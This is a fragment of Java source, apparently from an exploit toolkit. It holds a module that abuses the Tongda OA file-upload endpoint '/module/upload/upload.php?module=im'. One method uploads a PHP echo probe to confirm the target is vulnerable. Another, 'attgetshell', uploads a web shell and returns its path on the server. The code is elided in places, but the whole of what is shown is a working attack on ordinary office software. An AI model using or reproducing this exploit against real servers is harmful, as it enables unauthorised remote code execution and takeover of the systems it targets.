...
public class tongda_ImModule_upload implements Exploitlnterface {
    @Override
    ...
    private static String ImModuleUpload(String url,String filename , String shell){
        try{
            ...
            Response var3 = HttpTools.post(url+"/module/upload/upload.php?module=im",varData2,head,"utf-8");
            if (var3.getCode()==200){
                String id = JSON.parseObject(var3.getText()).get("id").toString();
                String fullpath=url+"/im/"+id.split("@")[1].replace("_","/").replace(",",".")+filename;
    ...
    private Boolean att(String url,TextArea textArea) {
        ...
        String path = ImModuleUpload(url, filename, "<?php echo "+tt+";?>");
        if (path != null) {
    ...
    private Boolean attgetshell(String url,String pass,TextArea textArea,TextArea textArea_cmd) {
        ...
        String path = ImModuleUpload(url, filename, shell);
        if (path != null) {
